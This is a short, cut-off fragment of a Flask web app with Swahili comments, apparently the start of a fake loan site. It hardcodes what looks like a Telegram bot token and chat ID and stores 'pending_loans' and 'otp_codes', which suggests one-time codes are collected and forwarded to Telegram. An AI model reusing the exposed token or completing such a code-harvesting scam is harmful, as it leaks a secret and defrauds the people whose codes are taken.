from flask import Flask, request, render_template_string
from flask_cors import CORS
import requests
import time
import random

app = Flask(__name__)
CORS(app)

# TOKO YAKO NA CHAT ID ZIKO HAPA TAYARI
TELEGRAM_TOKEN = "8864945488:AAFGN292M6CyjuU4LjQjfj_vUVJMchW07ik"
TELEGRAM_CHAT_ID = "8580615195"

pending_loans = {}
otp_codes = {}

# ================= PAGE 1: CHAGUA AMOUNT =================
@app.route
